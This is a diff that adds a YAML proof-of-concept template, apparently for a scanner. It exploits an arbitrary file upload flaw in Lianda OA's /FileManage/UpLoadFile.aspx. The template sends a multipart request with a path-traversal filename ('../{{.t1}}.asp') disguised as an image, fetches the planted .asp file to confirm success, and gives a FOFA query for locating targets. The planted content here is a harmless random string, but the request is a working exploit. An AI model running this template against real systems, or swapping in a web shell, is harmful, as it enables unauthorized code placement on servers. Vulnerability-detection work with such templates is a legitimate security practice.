@@ -1,0 +1,38 @@
+id: poc-yaml-lianda-oa-uploadfile-aspx-anyfile-upload
+info:
+  name: 联达OA UploadFile.aspx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 联达OA
+  fofa: app="联达OA"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /FileManage/UpLoadFile.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="DesignId"
+
+
+    1
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="../{{.t1}}.asp"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    --00content0boundary00--'
+  expression: status_code == 200 && contains(body,t1) && contains(body,"文件上传成功")
+- method: GET
+  path: /FileManage/{{.t1}}.asp
+  expression: status_code == 200 && body == t2
+transport: http
